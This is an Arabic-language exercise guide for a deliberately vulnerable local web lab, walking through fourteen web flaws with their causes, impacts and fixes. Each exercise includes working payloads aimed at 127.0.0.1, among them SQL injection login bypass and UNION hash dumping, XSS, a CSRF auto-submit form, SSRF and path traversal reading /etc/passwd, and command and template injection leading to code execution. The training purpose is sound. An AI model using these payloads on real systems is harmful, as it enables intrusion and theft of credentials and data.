# 🧪 التمارين العملية — استغلال كل الثغرات خطوة بخطوة

امشِ على هذي التمارين بالترتيب وأنت فاتح المختبر على `http://127.0.0.1:5000`.
كل تمرين فيه: **الثغرة → الموقع → الاستغلال → الأثر → الإصلاح**.
الأوامر مكتوبة بـ `curl` حتى تشوف الطلب الخام، وتگدر تسوي نفس الشي من المتصفح.

> 💡 بعد كل تمرين، افتح `lab/app.py` ودوّر على الوسم `# [VULN-XX]` حتى تشوف السطر الهشّ.

---

## [01] SQL Injection — تجاوز تسجيل الدخول

- **الموقع:** `/login`
- **السبب:** الاستعلام مبني بدمج نصي: `"... WHERE username='%s' AND password_md5='%s'"`.
- **الاستغلال:** حط باسم المستخدم حقنة تخلّي الشرط دائماً صحيح وتعلّق الباقي:

```bash
curl -s -X POST http://127.0.0.1:5000/login \
  --data "username=admin'--&password=x"
```

اسم المستخدم `admin'--` يحوّل الاستعلام إلى:
`SELECT * FROM users WHERE username='admin'-- AND password...` → يتجاهل السر ويسجّلك أدمن.

- **الأثر:** دخول كأي مستخدم بدون معرفة كلمة السر.
- **الإصلاح:** استخدم **استعلامات مُعاملة (parameterized)**:
  `db.execute("SELECT * FROM users WHERE username=? AND password_md5=?", (u, pm))`.

---

## [02] SQL Injection — استخراج بيانات (UNION)

- **الموقع:** `/search?q=`
- **السبب:** نفس المشكلة، لكن هنا نقدر نسحب بيانات من جداول ثانية.
- **الاستغلال:** الاستعلام يرجّع 3 أعمدة (`id, username, role`)، فنسوي `UNION` بنفس العدد:

```bash
curl -s "http://127.0.0.1:5000/search?q=zzz'%20UNION%20SELECT%20username,password_md5,role%20FROM%20users--%20"
```

راح تشوف **هاشات كلمات السر** تنعرض مكان أسماء المستخدمين.

- **الأثر:** تسريب كامل لمحتوى قاعدة البيانات (مستخدمين، هاشات، أسرار).
- **الإصلاح:** استعلامات مُعاملة + مبدأ الصلاحية الأدنى لحساب قاعدة البيانات.

---

## [03] Reflected XSS — سكربت منعكس

- **الموقع:** `/search?q=`
- **السبب:** مدخل المستخدم ينعرض بالـ HTML بدون ترميز.
- **الاستغلال:** افتح بالمتصفح:

```
http://127.0.0.1:5000/search?q=<script>alert(document.domain)</script>
```

- **الأثر:** تنفيذ جافاسكربت بمتصفح الضحية (سرقة جلسات، تصيّد، إجراءات باسمه).
- **الإصلاح:** رمّز المخرجات (HTML-encode)، واستخدم محرّك قوالب يهرّب تلقائياً
  (Jinja2 autoescape)، وأضف `Content-Security-Policy`.

---

## [04] Stored XSS — سكربت مخزّن

- **الموقع:** `/messages`
- **السبب:** الرسائل تُخزّن وتُعرض لاحقاً بدون ترميز، فالحقنة تضرب كل زائر.
- **الاستغلال:** أرسل رسالة محتواها:

```html
<script>alert('stored xss')</script>
```

ارجع للصفحة — راح ينفّذ لكل من يفتحها.

- **الأثر:** أخطر من المنعكس — يصيب كل المستخدمين تلقائياً.
- **الإصلاح:** ترميز عند العرض + تطهير المدخلات + CSP.

## [05] Broken Authentication — جلسة قابلة للتزوير

- **الموقع:** كوكي `session` و `role` بعد `/login`.
- **السبب:** الكوكي = اسم المستخدم بنص صريح **بدون توقيع**، والسر مخزّن `md5` بدون ملح.
- **الاستغلال:** زوّر الكوكي بدون أي دخول:

```bash
curl -s http://127.0.0.1:5000/ -b "session=admin; role=admin"
```

وكلمات السر `md5` تنكسر فوراً بجداول جاهزة (مثلاً `5f4dcc3b...` = `password`).

- **الأثر:** انتحال أي مستخدم وتصعيد صلاحية.
- **الإصلاح:** جلسات موقّعة/عشوائية على الخادم، تخزين السر بـ `bcrypt`/`argon2`،
  وتحديد محاولات الدخول (rate limiting).

---

## [06] IDOR — وصول مباشر لبيانات غير مصرّحة

- **الموقع:** `/profile?id=`
- **السبب:** يعرض بيانات أي مستخدم حسب `id` بدون التحقق من هوية الطالب.
- **الاستغلال:** بدّل الرقم:

```bash
curl -s "http://127.0.0.1:5000/profile?id=4"   # بيانات الـ CEO: API key + بطاقة
```

- **الأثر:** تسريب بيانات حساسة لكل المستخدمين بتغيير رقم.
- **الإصلاح:** تحقّق من الصلاحية: `id` المطلوب لازم يساوي هوية صاحب الجلسة
  (أو يكون أدمن) قبل عرض البيانات.

---

## [07] Missing Access Control — لوحة أدمن مكشوفة

- **الموقع:** `/admin`
- **السبب:** صفحة إدارية حساسة بدون أي فحص صلاحية.
- **الاستغلال:**

```bash
curl -s http://127.0.0.1:5000/admin   # يعرض كل المستخدمين ومفاتيحهم وبطاقاتهم
```

- **الأثر:** أي زائر يوصل لوظائف وبيانات الإدارة.
- **الإصلاح:** تحقّق من الدور على الخادم في كل نقطة نهاية إدارية (deny-by-default).

---

## [08] CSRF — تزوير طلب عبر المواقع

- **الموقع:** `/messages` (POST بدون توكن).
- **السبب:** ماكو CSRF token، فأي موقع خارجي يقدر يرسل الطلب نيابة عن المستخدم.
- **الاستغلال:** صفحة خبيثة تحتوي فورم يرسل تلقائياً:

```html
<form action="http://127.0.0.1:5000/messages" method="POST">
  <input name="body" value="رسالة مزوّرة باسم الضحية">
</form>
<script>document.forms[0].submit()</script>
```

- **الأثر:** تنفيذ إجراءات باسم المستخدم بدون علمه.
- **الإصلاح:** CSRF token لكل فورم + كوكيز بخاصية `SameSite` + تحقّق من `Origin`.

---

## [09] Sensitive Data Exposure — تسريب أسرار

- **الموقع:** `/debug` + رسائل الأخطاء المفصّلة + أسرار مكتوبة بالكود.
- **الاستغلال:**

```bash
curl -s http://127.0.0.1:5000/debug   # يكشف APP_SECRET و SECRET_KEY والمسارات
```

جرّب أيضاً تدخل حقنة تكسر الاستعلام بـ `/login` وشوف رسالة الخطأ تكشف الـ SQL.

- **الأثر:** تسريب مفاتيح وأسرار تسهّل هجمات أعمق.
- **الإصلاح:** احذف نقاط الـ debug بالإنتاج، أخفِ تفاصيل الأخطاء، خزّن الأسرار
  بمتغيّرات بيئة/خزنة أسرار، ولا تكتبها بالكود.

---

## [10] SSRF — تزوير طلب من جهة الخادم

- **الموقع:** `/fetch?url=`
- **السبب:** الخادم يجلب أي رابط يعطيه المستخدم.
- **الاستغلال:** خلّي الخادم يوصل لموارد داخلية ما تقدر توصلها أنت:

```bash
curl -s "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:5000/admin"
curl -s "http://127.0.0.1:5000/fetch?url=file:///etc/passwd"
```

(بالبيئات السحابية، SSRF يوصل لنقاط الميتاداتا الداخلية — خطير جداً.)

- **الأثر:** وصول لخدمات داخلية، تسريب ملفات، أحياناً تنفيذ أوامر.
- **الإصلاح:** قائمة سماح للنطاقات/المخططات، امنع العناوين الداخلية، وامنع `file://`.

---

## [11] Command Injection — حقن أوامر نظام

- **الموقع:** `/ping?host=`
- **السبب:** مدخل المستخدم يُدمج في أمر شل.
- **الاستغلال:**

```bash
curl -s "http://127.0.0.1:5000/ping?host=127.0.0.1;id"
```

راح تشوف مخرجات `id` — يعني **تنفيذ أوامر على الخادم (RCE)**.

- **الأثر:** سيطرة كاملة على الخادم.
- **الإصلاح:** لا تمرّر مدخلات للشل أبداً؛ استخدم مكتبات آمنة أو
  `subprocess.run([...], shell=False)` مع تحقّق صارم من المدخل.

---

## [12] Path Traversal — اجتياز المسار

- **الموقع:** `/download?file=`
- **السبب:** اسم الملف يُدمج بالمسار بدون تطهير.
- **الاستغلال:**

```bash
curl -s "http://127.0.0.1:5000/download?file=../app.py"      # يقرأ كود التطبيق
curl -s "http://127.0.0.1:5000/download?file=../../../../etc/passwd"
```

- **الأثر:** قراءة ملفات حساسة خارج المجلد المسموح.
- **الإصلاح:** نظّف اسم الملف (`os.path.basename`)، تحقّق أن المسار النهائي داخل
  المجلد المسموح، واستخدم قائمة سماح.

---

## [13] SSTI — حقن قالب من جهة الخادم

- **الموقع:** `/greet?name=`
- **السبب:** مدخل المستخدم يُدمج داخل قالب يُنفّذ على الخادم.
- **الاستغلال:** تأكّد أولاً إنها تُنفّذ:

```
http://127.0.0.1:5000/greet?name={{7*7}}     → يطلع "أهلاً 49"
```

ثم تصعيد إلى تنفيذ أوامر:

```bash
curl -s -g "http://127.0.0.1:5000/greet?name={{cycler.__init__.__globals__.os.popen('id').read()}}"
```

- **الأثر:** تنفيذ أوامر على الخادم (RCE).
- **الإصلاح:** لا تضع مدخل المستخدم في نص القالب؛ مرّره كـ **متغيّر** للقالب:
  `render_template_string("أهلاً {{ name }}", name=name)`.

---

## [14] Insecure File Upload — رفع ملف غير آمن

- **الموقع:** `/upload`
- **السبب:** يحفظ أي ملف بأي امتداد بدون فحص نوع/محتوى.
- **الاستغلال:** ارفع ملف باسم خبيث (مثلاً `shell.py` أو `.html` فيه سكربت). بالأنظمة
  اللي تخدم المجلد أو تنفّذه، هذا يؤدي لتنفيذ كود أو XSS مخزّن عبر الملف.
- **الأثر:** تنفيذ كود، تشويه، أو XSS حسب كيفية خدمة الملفات.
- **الإصلاح:** قائمة سماح للامتدادات، تحقّق من نوع المحتوى الحقيقي، أعد تسمية الملفات،
  واخزنها خارج جذر الويب بدون صلاحية تنفيذ.
